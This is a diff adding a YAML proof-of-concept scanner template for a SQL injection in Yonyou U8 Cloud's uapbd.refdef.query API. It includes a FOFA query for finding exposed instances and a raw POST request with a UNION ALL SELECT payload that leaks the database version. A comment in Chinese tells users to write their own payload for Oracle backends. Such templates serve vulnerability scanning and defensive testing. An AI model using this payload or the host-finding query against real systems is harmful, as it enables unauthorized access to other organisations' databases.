@@ -1,0 +1,35 @@
+id: poc-gwd97aqix44ngbem
+info:
+  name: 用友U8 Cloud uapbd.refdef.query SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gwd97aqix44ngbem'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gwd97aqix44ngbem
+    fofa: title=="U8C"
+http:
+- raw:
+  - 'POST /u8cloud/openapi/uapbd.refdef.query?appcode=huo&isEncrypt=N HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+    Content-Type: application/json
+
+    Accept-Encoding: gzip
+
+    Connection: close
+
+
+    {"refName":"1%'' UNION ALL SELECT 1,CONVERT(INT,@@VERSION),1-- "}
+
+
+    部分数据库为Oracle，自行构造payload'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
